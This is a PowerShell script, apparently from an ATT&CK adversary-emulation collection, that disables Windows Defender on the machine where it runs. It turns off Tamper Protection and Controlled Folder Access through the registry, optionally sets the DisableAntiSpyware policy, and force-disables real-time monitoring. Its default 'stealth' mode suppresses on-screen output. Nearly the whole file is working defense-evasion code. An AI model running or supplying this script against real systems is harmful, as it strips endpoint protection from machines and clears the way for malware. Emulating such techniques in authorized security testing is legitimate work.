# T1562.001E - MITRE ATT&CK Impair Defenses: Disable Windows Defender Tamper Protection
# Tactic: TA0005 Defense Evasion - Specific Tamper Protection disable only
# Package Type: inject - Active system modification (single atomic action)
# Script Length: ~130 lines (atomic focus)
# Functions: 5 infrastructure + 4 triple output + 1 technique function

#Requires -Version 3.0
#Requires -RunAsAdministrator


function Get-EnvironmentVariables {
    $config = @{
        # Variables de base
        OUTPUT_BASE = if ($env:T1562_001_OUTPUT_BASE) { $env:T1562_001_OUTPUT_BASE } else { "C:\temp\mitre_results" }
        DEBUG_MODE = if ($env:T1562_001_DEBUG_MODE) { $env:T1562_001_DEBUG_MODE -eq "true" } else { $false }
        STEALTH_MODE = if ($env:T1562_001_STEALTH_MODE) { $env:T1562_001_STEALTH_MODE -eq "true" } else { $true }
        SAFE_MODE = if ($env:T1562_001_SAFE_MODE) { $env:T1562_001_SAFE_MODE -eq "true" } else { $false }
        
        # Variables sp cifiques Tamper Protection
        REGISTRY_METHOD = if ($env:T1562_001_REGISTRY_METHOD) { $env:T1562_001_REGISTRY_METHOD -eq "true" } else { $true }
        POLICY_METHOD = if ($env:T1562_001_POLICY_METHOD) { $env:T1562_001_POLICY_METHOD -eq "true" } else { $false }
        VERIFY_DISABLE = if ($env:T1562_001_VERIFY_DISABLE) { $env:T1562_001_VERIFY_DISABLE -eq "true" } else { $true }
        BACKUP_SETTINGS = if ($env:T1562_001_BACKUP_SETTINGS) { $env:T1562_001_BACKUP_SETTINGS -eq "true" } else { $true }
        FORCE_DISABLE = if ($env:T1562_001_FORCE_DISABLE) { $env:T1562_001_FORCE_DISABLE -eq "true" } else { $false }
    }
    
    return $config
}

function Initialize-OutputStructure {
    param([string]$OutputBase, [string]$TechniqueId)
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputDir = Join-Path $OutputBase "${TechniqueId}_${timestamp}"
    
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    }
    
    return $outputDir
}

function Write-JsonOutput {
    param([hashtable]$Data, [string]$OutputPath, [hashtable]$Metadata)
    
    $jsonOutput = @{
        technique_id = $Metadata.technique_id
        timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        results = $Data
        system_context = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
        }
    }
    
    $jsonOutput | ConvertTo-Json -Depth 5 | Out-File -FilePath $OutputPath -Encoding UTF8
}

function Get-ExecutionMetadata {
    param([string]$TechniqueId, [string]$Action)
    
    return @{
        technique_id = $TechniqueId
        action = $Action
        timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        hostname = $env:COMPUTERNAME
    }
}

function Invoke-SafeCommand {
    param([string]$Command, [hashtable]$Config, [string]$Description = "")
    
    if ($Config.SAFE_MODE) {
        if (-not $Config.STEALTH_MODE) {
            Write-Host "[SAFE MODE - REAL EXECUTION] Executing: $Description" -ForegroundColor Yellow
        }
    }
    
    try {
        $result = Invoke-Expression $Command 2>&1
        return @{ success = $true; output = $result }
    }
    catch {
        return @{ success = $false; output = $_.Exception.Message }
    }
}


function Write-SimpleOutput {
    param([hashtable]$Results, [hashtable]$Config)
    
    if ($Config.STEALTH_MODE) { return }
    
    Write-Host "T1562.001E TAMPER PROTECTION DISABLED " -ForegroundColor Red
    Write-Host "Registry Method: $($Results.registry_disabled)" -ForegroundColor Green
    Write-Host "Policy Method: $($Results.policy_disabled)" -ForegroundColor Green
    Write-Host "Verification: $($Results.tamper_protection_status)" -ForegroundColor Yellow
}

function Write-DebugOutput {
    param([hashtable]$Results, [string]$OutputPath, [hashtable]$Metadata, [hashtable]$Config)
    
    if ($Config.DEBUG_MODE) {
        $debugFile = Join-Path (Split-Path $OutputPath) "debug_tamper_protection.json"
        Write-JsonOutput -Data $Results -OutputPath $debugFile -Metadata $Metadata
    }
}

function Write-StealthOutput {
    param([hashtable]$Results, [string]$OutputPath, [hashtable]$Config)
    
    if ($Config.STEALTH_MODE) {
        $stealthFile = Join-Path (Split-Path $OutputPath) "tamper_protection.log"
        "T1562.001E executed at $(Get-Date)" | Out-File -FilePath $stealthFile -Append
    }
}

function Select-OutputMode {
    param([hashtable]$Results, [string]$OutputPath, [hashtable]$Metadata, [hashtable]$Config)
    
    Write-SimpleOutput -Results $Results -Config $Config
    Write-DebugOutput -Results $Results -OutputPath $OutputPath -Metadata $Metadata -Config $Config
    Write-StealthOutput -Results $Results -OutputPath $OutputPath -Config $Config
}


# TECHNIQUE-SPECIFIC FUNCTION (ATOMIC ACTION)


function Disable-TamperProtection {
    param([hashtable]$Config)
    
    $results = @{
        registry_disabled = $false
        policy_disabled = $false
        tamper_protection_status = "unknown"
        backup_created = $false
        errors = @()
    }
    
    # 1. Backup Current Settings (if configured)
    if ($Config.BACKUP_SETTINGS) {
        $backupPath = Join-Path $Config.OUTPUT_BASE "tamper_protection_backup.reg"
        $cmd = "reg export 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features' '$backupPath' /y"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Backing up tamper protection settings"
        
        if ($result.success) {
            $results.backup_created = $true
        }
    }
    
    # 2. Registry Method (Primary)
    if ($Config.REGISTRY_METHOD) {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
        
        # Disable Tamper Protection via registry
        $cmd = "Set-ItemProperty -Path '$regPath' -Name 'TamperProtection' -Value 0 -Type DWord"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Disabling tamper protection via registry"
        
        if ($result.success) {
            $results.registry_disabled = $true
        } else {
            $results.errors += "Registry disable failed: $($result.output)"
        }
        
        # Additional tamper protection related keys
        $additionalKeys = @(
            @{ Name = "TamperProtectionSource"; Value = 0 },
            @{ Name = "EnableControlledFolderAccess"; Value = 0 }
        )
        
        foreach ($key in $additionalKeys) {
            $cmd = "Set-ItemProperty -Path '$regPath' -Name '$($key.Name)' -Value $($key.Value) -Type DWord"
            $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Setting $($key.Name)"
            
            if (-not $result.success) {
                $results.errors += "Failed to set $($key.Name): $($result.output)"
            }
        }
    }
    
    # 3. Group Policy Method (Alternative)
    if ($Config.POLICY_METHOD) {
        $policyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        
        # Create policy path if it doesn't exist
        $cmd = "if (-not (Test-Path '$policyPath')) { New-Item -Path '$policyPath' -Force }"
        Invoke-SafeCommand -Command $cmd -Config $Config -Description "Creating policy path"
        
        # Disable via group policy
        $cmd = "Set-ItemProperty -Path '$policyPath' -Name 'DisableAntiSpyware' -Value 1 -Type DWord"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Disabling via group policy"
        
        if ($result.success) {
            $results.policy_disabled = $true
        } else {
            $results.errors += "Policy disable failed: $($result.output)"
        }
    }
    
    # 4. Force Disable (if configured)
    if ($Config.FORCE_DISABLE) {
        $forceCommands = @(
            "Set-MpPreference -DisableTamperProtection $true",
            "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1"
        )
        
        foreach ($cmd in $forceCommands) {
            $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Force disabling protection"
            
            if (-not $result.success) {
                $results.errors += "Force disable command failed: $($result.output)"
            }
        }
    }
    
    # 5. Verify Status (if configured)
    if ($Config.VERIFY_DISABLE) {
        $verifyCmd = 'Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" | Select-Object TamperProtection'
        $result = Invoke-SafeCommand -Command $verifyCmd -Config $Config -Description "Verifying tamper protection status"
        
        if ($result.success) {
            $tamperValue = $result.output.TamperProtection
            $results.tamper_protection_status = if ($tamperValue -eq 0) { "disabled" } else { "enabled" }
        }
    }
    
    return $results
}


# MAIN EXECUTION


try {
    $config = Get-EnvironmentVariables
    $metadata = Get-ExecutionMetadata -TechniqueId "T1562.001e" -Action "disable_tamper_protection"
    $outputDir = Initialize-OutputStructure -OutputBase $Config.OUTPUT_BASE -TechniqueId $metadata.technique_id
    
    $results = Disable-TamperProtection -Config $config
    
    $outputFile = Join-Path $outputDir "tamper_protection_results.json"
    Select-OutputMode -Results $results -OutputPath $outputFile -Metadata $metadata -Config $config
    
} catch {
    if (-not $Config.STEALTH_MODE) {
        Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
    }
    exit 1
}


